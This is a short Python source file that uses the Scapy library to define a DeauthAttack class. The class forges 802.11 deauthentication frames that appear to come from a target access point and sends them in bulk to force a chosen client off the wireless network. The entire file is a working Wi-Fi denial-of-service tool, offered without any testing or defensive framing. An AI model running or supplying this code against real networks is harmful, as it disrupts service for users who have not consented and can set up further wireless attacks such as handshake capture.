from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp
import logging

class DeauthAttack:
    def __init__(self, interface: str, target_bssid: str, target_client: str):
        self.interface = interface
        self.target_bssid = target_bssid
        self.target_client = target_client

    def send_deauth(self, count: int = 100):
        dot11 = Dot11(addr1=self.target_client, addr2=self.target_bssid, addr3=self.target_bssid)
        frame = RadioTap()/dot11/Dot11Deauth(reason=7)
        logging.info(f"Sending {count} deauth packets from {self.target_bssid} to {self.target_client}")
        sendp(frame, iface=self.interface, count=count, inter=0.1)

